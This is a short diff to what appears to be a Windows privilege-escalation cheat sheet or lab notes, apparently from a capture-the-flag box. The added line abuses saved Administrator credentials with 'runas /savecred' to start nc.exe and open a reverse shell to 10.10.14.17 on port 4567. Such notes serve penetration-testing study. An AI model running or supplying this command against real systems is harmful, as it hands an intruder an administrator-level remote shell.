@@ -128,6 +128,8 @@ dir /r aka ls -la
 cmdkey /list
 
 runas /usr:ACCESS\Administrator /savecred cmd /c 
+
+runas /usr:ACCESS\Administrator /savecred "cmd /c C:\Users\security\Desktop\nc.exe 10.10.14.17 4567 -e cmd.exe"
 ```
 
 # Credential Extracting
